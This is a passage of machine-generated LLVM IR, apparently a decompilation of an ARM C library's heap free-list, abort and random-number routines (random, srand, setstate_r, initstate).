  br i1 %v3_13850, label %dec_label_pc_138e0, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13840
  %v2_13854 = add i32 %v2_13840, %arg3
  store i32 %v2_13854, i32* %r7.global-to-local, align 4
  br i1 %v9_1384c, label %dec_label_pc_1385c, label %dec_label_pc_13888

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13854
  %v2_1385c = icmp eq i32 %v0_13870, 0
  br i1 %v2_1385c, label %dec_label_pc_138d4, label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_1385c
  %v1_13864 = add i32 %v0_13870, 12
  %v9_13868 = icmp eq i32 %v1_13864, %arg2
  br i1 %v9_13868, label %dec_label_pc_13870, label %dec_label_pc_138d4

dec_label_pc_13870:                               ; preds = %dec_label_pc_13864
  %v1_13870 = inttoptr i32 %v0_13870 to i32*
  %v2_13870 = load i32, i32* %v1_13870, align 4
  %v1_13874 = add i32 %v0_13870, 8
  %v2_13874 = inttoptr i32 %v1_13874 to i32*
  %v3_13874 = load i32, i32* %v2_13874, align 4
  store i32 %v3_13874, i32* @r2, align 4
  store i32 %v0_13878, i32* @r1, align 4
  %v2_1387c = add i32 %v2_13870, %v2_13854
  store i32 %v2_1387c, i32* %r7.global-to-local, align 4
  %v0_13880 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_138d4

dec_label_pc_13888:                               ; preds = %dec_label_pc_13854
  %v1_13888 = add i32 %v0_13878, 4
  %v2_13888 = inttoptr i32 %v1_13888 to i32*
  %v3_13888 = load i32, i32* %v2_13888, align 4
  store i32 %v3_13888, i32* %r5.global-to-local, align 4
  %v2_1388c = icmp eq i32 %v3_13888, 0
  br i1 %v2_1388c, label %dec_label_pc_138c0, label %dec_label_pc_13894

dec_label_pc_13894:                               ; preds = %dec_label_pc_13888
  %v1_13894 = inttoptr i32 %v3_13888 to i32*
  %v2_13894 = load i32, i32* %v1_13894, align 4
  store i32 %v2_13894, i32* @ip, align 4
  %v2_13898 = sub i32 %v3_13888, %v2_13894
  %v1_1389c = add i32 %v2_13898, 12
  %v9_138a0 = icmp eq i32 %v2_13814, %v1_1389c
  br i1 %v9_138a0, label %dec_label_pc_138a8, label %dec_label_pc_138c0

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13894
  store i32 %v0_13870, i32* @r2, align 4
  store i32 %v3_13888, i32* @r1, align 4
  %v2_138b0 = add i32 %v2_13894, %v2_13854
  store i32 %v2_138b0, i32* %r7.global-to-local, align 4
  %v0_138b4 = call i32 @__heap_link_free_area_after()
  %v0_138b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138d4

dec_label_pc_138c0:                               ; preds = %dec_label_pc_13894, %dec_label_pc_13888
  %v2_138c0 = add i32 %v0_13878, %arg3
  store i32 %v2_138c0, i32* %r4.global-to-local, align 4
  store i32 %v3_13888, i32* @r3, align 4
  store i32 %v0_13870, i32* @r2, align 4
  store i32 %v2_138c0, i32* @r1, align 4
  %v0_138d0 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_13864, %dec_label_pc_1385c, %dec_label_pc_138a8, %dec_label_pc_13870, %dec_label_pc_138c0
  %v0_138d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138d4, i32* %r5.global-to-local, align 4
  %v0_138d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_138d8 = inttoptr i32 %v0_138d4 to i32*
  store i32 %v0_138d8, i32* %v2_138d8, align 4
  br label %dec_label_pc_138f8

dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge: ; preds = %dec_label_pc_13828
  br label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %entry, %dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge, %dec_label_pc_13840
  %v1_138e0 = add i32 %v2_13814, -12
  store i32 %v1_138e0, i32* %r5.global-to-local, align 4
  %v3_138e4 = inttoptr i32 %v1_138e0 to i32*
  store i32 %arg3, i32* %v3_138e4, align 4
  %v0_138e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138e8, i32* @r3, align 4
  %v0_138ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_138ec, i32* @r2, align 4
  %v0_138f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138f0, i32* @r1, align 4
  %v0_138f4 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_138f8

dec_label_pc_138f8:                               ; preds = %dec_label_pc_138d4, %dec_label_pc_138e0
  %v0_138f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_138fc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_138fc, i32* @r4, align 4
  ret i32 %v0_138f8

; uselistorder directives
  uselistorder i32 %v3_13888, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_1384c, { 1, 0 }
  uselistorder i32 %v3_1382c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13878, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_13870, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_138f8, { 1, 0 }
  uselistorder label %dec_label_pc_138e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_138d4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_13820, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_1391c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_13900 = ptrtoint i32* %stack_var_-268 to i32
  %v2_13910 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2aacc.705 to i32))
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_1391c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %dec_label_pc_1391c.lr.ph, %dec_label_pc_1391c
  %v1_13920 = phi i32 [ 31, %dec_label_pc_1391c.lr.ph ], [ %v1_1392c, %dec_label_pc_1391c ]
  %v4_13920 = mul i32 %v1_13920, 4
  %v5_13920 = add i32 %v4_13920, %v2_1391c
  %v2_13928 = add i32 %v5_13920, -128
  %v3_13928 = inttoptr i32 %v2_13928 to i32*
  store i32 0, i32* %v3_13928, align 4
  %v0_1392c = load i32, i32* %r1.global-to-local, align 4
  %v1_1392c = add i32 %v0_1392c, -1
  store i32 %v1_1392c, i32* %r1.global-to-local, align 4
  %v6_1392c = icmp slt i32 %v1_1392c, 0
  br i1 %v6_1392c, label %dec_label_pc_13934, label %dec_label_pc_1391c

dec_label_pc_13934:                               ; preds = %dec_label_pc_1391c
  %v2_13934 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_13934, i32* @r4, align 4
  store i32 %v2_13934, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_13940 = call i32 @__sigaddset()
  %v2_13944 = icmp eq i32 %v0_13940, 0
  br i1 %v2_13944, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13934
  store i32 %v2_13934, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13934, %bb
  store i32 80216, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13944, i32 ptrtoint (i32* @global_var_10934.547 to i32))
  %v2_1395c = load i32, i32* @global_var_2f3d4.708, align 4
  %v2_13960 = icmp eq i32 %v2_1395c, 0
  br i1 %v2_13960, label %dec_label_pc_13968, label %dec_label_pc_13998

dec_label_pc_13968:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2f3d4.708, align 4
  br label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %dec_label_pc_139e8, %dec_label_pc_13968
  store i32 ptrtoint (i32* @global_var_2aacc.705 to i32), i32* @r0, align 4
  %v1_1397c = call i32 @pthread_mutex_unlock()
  %v1_13984 = call i32 @__GI_raise(i32 6)
  store i32 80280, i32* @lr, align 4
  %v2_13994 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2aacc.705 to i32))
  %v2_1399c.pre = load i32, i32* @global_var_2f3d4.708, align 4
  br label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %.thread1, %dec_label_pc_13970
  %v0_13a0c = phi i32 [ %v2_1395c, %.thread1 ], [ %v2_1399c.pre, %dec_label_pc_13970 ]
  store i32 ptrtoint (i32* @global_var_2f3d4.708 to i32), i32* %ip.global-to-local, align 4
  %v7_139a0 = icmp eq i32 %v0_13a0c, 1
  br i1 %v7_139a0, label %dec_label_pc_139d0.lr.ph, label %dec_label_pc_13a04

dec_label_pc_139d0.lr.ph:                         ; preds = %dec_label_pc_13998
  store i32 0, i32* @r1, align 4
  store i32 %v2_13900, i32* @r0, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2f3d4.708, align 4
  %v0_139bc = call i32 @__GI_memset()
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139d0

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139d0.lr.ph, %dec_label_pc_139d0
  %v1_139d4 = phi i32 [ 31, %dec_label_pc_139d0.lr.ph ], [ %v1_139e0, %dec_label_pc_139d0 ]
  %v4_139d4 = mul i32 %v1_139d4, 4
  %v5_139d4 = add i32 %v4_139d4, %v2_1391c
  %v2_139dc = add i32 %v5_139d4, -264
  %v3_139dc = inttoptr i32 %v2_139dc to i32*
  store i32 -1, i32* %v3_139dc, align 4
  %v0_139e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_139e0 = add i32 %v0_139e0, -1
  store i32 %v1_139e0, i32* %r1.global-to-local, align 4
  %v6_139e0 = icmp slt i32 %v1_139e0, 0
  br i1 %v6_139e0, label %dec_label_pc_139e8, label %dec_label_pc_139d0

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139d0
  store i32 %v2_13900, i32* %r1.global-to-local, align 4
  %v4_139fc = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_13970

dec_label_pc_13a04:                               ; preds = %dec_label_pc_13998
  %v7_13a04 = icmp eq i32 %v0_13a0c, 2
  br i1 %v7_13a04, label %dec_label_pc_13a0c, label %dec_label_pc_13a18

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_13a04
  store i32 3, i32* @global_var_2f3d4.708, align 4
  %v0_13a14 = call i32 @abort()
  %v2_13a18.pre = load i32, i32* @global_var_2f3d4.708, align 4
  br label %dec_label_pc_13a18

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a04, %dec_label_pc_13a0c
  %v1_13a20 = phi i32 [ %v0_13a0c, %dec_label_pc_13a04 ], [ %v2_13a18.pre, %dec_label_pc_13a0c ]
  %v7_13a1c = icmp eq i32 %v1_13a20, 3
  br i1 %v7_13a1c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_13a18
  %v2_13a28 = load i32, i32* %ip.global-to-local, align 4
  %v3_13a28 = inttoptr i32 %v2_13a28 to i32*
  store i32 4, i32* %v3_13a28, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13a18, %bb27
  call void @__pseudo_cond_branch(i1 %v7_13a1c, i32 ptrtoint (i32* @global_var_fff0.710 to i32))
  br label %dec_label_pc_13a30

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a30, %.thread3
  %v0_13a30 = call i32 @abort()
  br label %dec_label_pc_13a30

; uselistorder directives
  uselistorder i32 %v1_139e0, { 2, 1, 0 }
  uselistorder i32 %v1_1392c, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 0, 5, 7, 6, 4 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 2, 13, 12, 4, 0, 3, 7, 6, 5, 21, 20, 19, 18, 22, 17, 16, 1, 15, 14, 8, 11, 10, 9 }
  uselistorder i32* @global_var_2f3d4.708, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_2aacc.705 to i32), { 0, 2, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13a18, { 1, 0 }
  uselistorder label %dec_label_pc_139d0, { 1, 0 }
  uselistorder label %dec_label_pc_13998, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_13a48 = call i32 @random()
  ret i32 %v0_13a48

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 3, 2, 5, 4, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13a4c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r4, align 4
  %v2_13a54 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_13a54, i32* @r0, align 4
  %v1_13a6c = call i32 @__pthread_cleanup_push_defer()
  %v0_13a74 = load i32, i32* @r4, align 4
  %v2_13a7c = call i32 @pthread_mutex_lock(i32 %v0_13a74)
  %v2_13a80 = ptrtoint i32* %stack_var_-16 to i32
  %v3_13a88 = call i32 @__GI_random_r(i32* inttoptr (i32 174844 to i32*), i32 %v2_13a80)
  store i32 %v2_13a54, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 80544, i32* @lr, align 4
  %v1_13a9c = call i32 @__pthread_cleanup_pop_restore()
  %v3_13aa0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_13a4c, i32* @r4, align 4
  ret i32 %v3_13aa0
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_13acc = ptrtoint i32* %stack_var_-28 to i32
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_13acc, i32* @r0, align 4
  %v1_13ae8 = call i32 @__pthread_cleanup_push_defer()
  %v2_13af8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2aae4.712 to i32))
  %v0_13b00 = load i32, i32* @r4, align 4
  %v3_13b08 = load i32, i32* bitcast (i32** @global_var_2ab04.725 to i32*), align 4
  store i32 %v3_13b08, i32* @r4, align 4
  %v3_13b0c = call i32 @setstate_r(i32 %v0_13b00, i32* nonnull @global_var_2aafc)
  store i32 1, i32* @r1, align 4
  %v1_13b14 = icmp slt i32 %v3_13b0c, 0
  store i32 %v2_13acc, i32* @r0, align 4
  %. = select i1 %v1_13b14, i32 0, i32 ptrtoint (i32** @global_var_2ab00.727 to i32)
  store i32 %., i32* @r5, align 4
  store i32 80688, i32* @lr, align 4
  %v1_13b2c = call i32 @__pthread_cleanup_pop_restore()
  %v0_13b30 = load i32, i32* @r5, align 4
  ret i32 %v0_13b30
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r4, align 4
  %v2_13b5c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r2, align 4
  store i32 %v2_13b5c, i32* @r0, align 4
  %v1_13b80 = call i32 @__pthread_cleanup_push_defer()
  %v0_13b84 = load i32, i32* @r4, align 4
  %v2_13b90 = call i32 @pthread_mutex_lock(i32 %v0_13b84)
  %v0_13b98 = load i32, i32* @r5, align 4
  %v0_13b9c = load i32, i32* @r6, align 4
  %v0_13ba0 = load i32, i32* @r8, align 4
  store i32 %v0_13ba0, i32* @r0, align 4
  %v3_13ba4 = load i32, i32* bitcast (i32** @global_var_2ab04.725 to i32*), align 4
  store i32 %v3_13ba4, i32* @r4, align 4
  %v4_13ba8 = inttoptr i32 %v0_13ba0 to i32*
  %v5_13ba8 = call i32 @__GI_initstate_r(i32* %v4_13ba8, i32 %v0_13b98, i32 %v0_13b9c, i32 ptrtoint (i32* @global_var_2aafc to i32))
  store i32 %v2_13b5c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 80832, i32* @lr, align 4
  %v1_13bbc = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_2ab00.727 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_13bec = load i32, i32* @r4, align 4
  %v6_13bec = load i32, i32* @r5, align 4
  %v9_13bec = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r4, align 4
  %v2_13bf4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2aae4.712 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_13bf4, i32* @r0, align 4
  %v1_13c10 = call i32 @__pthread_cleanup_push_defer()
  %v0_13c18 = load i32, i32* @r4, align 4
  %v2_13c20 = call i32 @pthread_mutex_lock(i32 %v0_13c18)
  %v0_13c24 = load i32, i32* @r6, align 4
  store i32 %v0_13c24, i32* @r0, align 4
  %v2_13c2c = inttoptr i32 %v0_13c24 to i32*
  %v3_13c2c = call i32 @srandom_r(i32* %v2_13c2c, i32 ptrtoint (i32* @global_var_2aafc to i32))
  store i32 %v2_13bf4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_13bf4, i32* @r5, align 4
  store i32 80968, i32* @lr, align 4
  %v1_13c44 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v3_13bec, i32* @r4, align 4
  store i32 %v6_13bec, i32* @r5, align 4
  store i32 %v9_13bec, i32* @r6, align 4
  ret i32 %v1_13c44

; uselistorder directives
  uselistorder i32* @global_var_2aafc, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2aafc to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2aae4.712 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_13c68 = add i32 %tmp, 12
  %v2_13c68 = inttoptr i32 %v1_13c68 to i32*
  %v3_13c68 = load i32, i32* %v2_13c68, align 4
  %v3_13c6c = load i32, i32* @r4, align 4
  store i32 %v3_13c6c, i32* %stack_var_-20, align 4
  %v2_13c70 = icmp eq i32 %v3_13c68, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_13c70, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_13c7c1 = add i32 %tmp, 8
  %v2_13c7c2 = inttoptr i32 %v1_13c7c1 to i32*
  %v3_13c7c3 = load i32, i32* %v2_13c7c2, align 4
  store i32 %v3_13c7c3, i32* %r1.global-to-local, align 4
  %v3_13c90 = add i32 %v3_13c7c3, -4
  %v4_13c90 = inttoptr i32 %v3_13c90 to i32*
  store i32 0, i32* %v4_13c90, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_13c78 = add i32 %tmp, 4
  %v3_13c78 = inttoptr i32 %v2_13c78 to i32*
  %v4_13c78 = load i32, i32* %v3_13c78, align 4
  %v1_13c7c = add i32 %tmp, 8
  %v2_13c7c = inttoptr i32 %v1_13c7c to i32*
  %v3_13c7c = load i32, i32* %v2_13c7c, align 4
  store i32 %v3_13c7c, i32* %r1.global-to-local, align 4
  %v3_13c80 = sub i32 %v4_13c78, %v3_13c7c
  %v4_13c84 = sdiv i32 %v3_13c80, 4
  %v4_13c8c = mul i32 %v4_13c84, 5
  %v5_13c8c = add i32 %v4_13c8c, %v3_13c68
  %v3_13c94 = add i32 %v3_13c7c, -4
  %v4_13c94 = inttoptr i32 %v3_13c94 to i32*
  store i32 %v5_13c8c, i32* %v4_13c94, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_13c98 = add i32 %arg1, 4
  store i32 %v1_13c98, i32* %r6.global-to-local, align 4
  %v2_13c9c = inttoptr i32 %arg1 to i32*
  %v3_13c9c = load i32, i32* %v2_13c9c, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_13ca4 = srem i32 %v3_13c9c, 5
  store i32 %v2_13ca4, i32* %r0.global-to-local, align 4
  %v2_13cb0 = and i32 %v2_13ca4, 1073741824
  %v3_13cb0 = icmp ne i32 %v2_13cb0, 0
  %v4_13cb0 = mul nsw i32 %v2_13ca4, 4
  %v2_13cb4 = icmp ne i32 %v2_13ca4, 4
  %v3_13cb4 = and i1 %v3_13cb0, %v2_13cb4
  br i1 %v3_13cb4, label %dec_label_pc_13d10, label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %bb
  %v5_13cb0 = add i32 %v4_13cb0, ptrtoint (i32* @global_var_1d62c.741 to i32)
  %v1_13cb8 = add i32 %v4_13cb0, add (i32 ptrtoint (i32* @global_var_1d62c.741 to i32), i32 20)
  %v2_13cb8 = inttoptr i32 %v1_13cb8 to i32*
  %v3_13cb8 = load i32, i32* %v2_13cb8, align 4
  store i32 %v3_13cb8, i32* %r5.global-to-local, align 4
  %v6_13cbc = inttoptr i32 %v5_13cb0 to i32*
  %v7_13cbc = load i32, i32* %v6_13cbc, align 4
  store i32 %v7_13cbc, i32* %r7.global-to-local, align 4
  %v2_13cc0 = icmp eq i32 %v2_13ca4, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_13cc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cc8 = add i32 %v1_13cc8, 16
  %v3_13cc8 = inttoptr i32 %v2_13cc8 to i32*
  store i32 %v3_13cb8, i32* %v3_13cc8, align 4
  %v0_13ccc = load i32, i32* %r7.global-to-local, align 4
  %v1_13ccc = load i32, i32* %r4.global-to-local, align 4
  %v2_13ccc = add i32 %v1_13ccc, 20
  %v3_13ccc = inttoptr i32 %v2_13ccc to i32*
  store i32 %v0_13ccc, i32* %v3_13ccc, align 4
  %v0_13cd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13cd0 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cd0 = add i32 %v1_13cd0, 12
  %v3_13cd0 = inttoptr i32 %v2_13cd0 to i32*
  store i32 %v0_13cd0, i32* %v3_13cd0, align 4
  br i1 %v2_13cc0, label %dec_label_pc_13cfc, label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13cb8
  %v0_13cd8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13cd8 = add i32 %v0_13cd8, -4
  %v2_13cd8 = inttoptr i32 %v1_13cd8 to i32*
  %v3_13cd8 = load i32, i32* %v2_13cd8, align 4
  %v1_13cdc = load i32, i32* %r1.global-to-local, align 4
  %v2_13cdc = sdiv i32 %v3_13cd8, %v1_13cdc
  store i32 %v2_13cdc, i32* %r0.global-to-local, align 4
  %v4_13ce0 = mul i32 %v2_13cdc, 4
  %v5_13ce0 = add i32 %v4_13ce0, %v0_13cd8
  %v1_13ce4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13ce4 = add i32 %v1_13ce4, 4
  %v3_13ce4 = inttoptr i32 %v2_13ce4 to i32*
  store i32 %v5_13ce0, i32* %v3_13ce4, align 4
  %v0_13ce8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ce8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ce8 = add i32 %v1_13ce8, %v0_13ce8
  %v0_13cec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13cec, i32* %r1.global-to-local, align 4
  %v2_13cf0 = srem i32 %v2_13ce8, %v0_13cec
  %v0_13cf4 = load i32, i32* %r6.global-to-local, align 4
  %v4_13cf4 = mul i32 %v2_13cf0, 4
  %v5_13cf4 = add i32 %v0_13cf4, %v4_13cf4
  store i32 %v5_13cf4, i32* %r0.global-to-local, align 4
  %v1_13cf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i32*
  store i32 %v5_13cf4, i32* %v2_13cf8, align 4
  br label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cb8, %dec_label_pc_13cd8
  %v0_13cfc = load i32, i32* %r6.global-to-local, align 4
  %v1_13cfc = load i32, i32* %r5.global-to-local, align 4
  %v4_13cfc = mul i32 %v1_13cfc, 4
  %v5_13cfc = add i32 %v4_13cfc, %v0_13cfc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13d04 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d04 = add i32 %v1_13d04, 24
  %v3_13d04 = inttoptr i32 %v2_13d04 to i32*
  store i32 %v5_13cfc, i32* %v3_13d04, align 4
  %v0_13d08 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d08 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d08 = add i32 %v1_13d08, 8
  %v3_13d08 = inttoptr i32 %v2_13d08 to i32*
  store i32 %v0_13d08, i32* %v3_13d08, align 4
  %v2_13d0c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d0c, i32* @r4, align 4
  ret i32 0

dec_label_pc_13d10:                               ; preds = %bb
  %v0_13d10 = call i32 @__errno_location()
  %v2_13d18 = inttoptr i32 %v0_13d10 to i32*
  store i32 22, i32* %v2_13d18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13d20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d20, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_13ca4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 1, 2, 6, 7, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_13d28 = add i32 %tmp, 12
  %v2_13d28 = inttoptr i32 %v1_13d28 to i32*
  %v3_13d28 = load i32, i32* %v2_13d28, align 4
  store i32 %v3_13d28, i32* %r3.global-to-local, align 4
  %v2_13d2c = icmp eq i32 %v3_13d28, 0
  %v3_13d30 = load i32, i32* @r4, align 4
  store i32 %v3_13d30, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_13d3c = add i32 %tmp, 8
  %v2_13d3c = inttoptr i32 %v1_13d3c to i32*
  %v3_13d3c = load i32, i32* %v2_13d3c, align 4
  store i32 %v3_13d3c, i32* %lr.global-to-local, align 4
  br i1 %v2_13d2c, label %dec_label_pc_13d44, label %dec_label_pc_13d68

dec_label_pc_13d44:                               ; preds = %entry
  %v1_13d44 = inttoptr i32 %v3_13d3c to i32*
  %v2_13d44 = load i32, i32* %v1_13d44, align 4
  store i32 %v2_13d44, i32* %r2.global-to-local, align 4
  %v2_13d4c = mul i32 %v2_13d44, 1103515245
  %v1_13d54 = add i32 %v2_13d4c, 12345
  %tmp10 = bitcast i32 %v1_13d54 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_13d58 = bitcast float %tmp11 to i32
  store i32 %v1_13d58, i32* %r3.global-to-local, align 4
  store i32 %v1_13d58, i32* %v1_13d44, align 4
  %v0_13d60 = load i32, i32* %r3.global-to-local, align 4
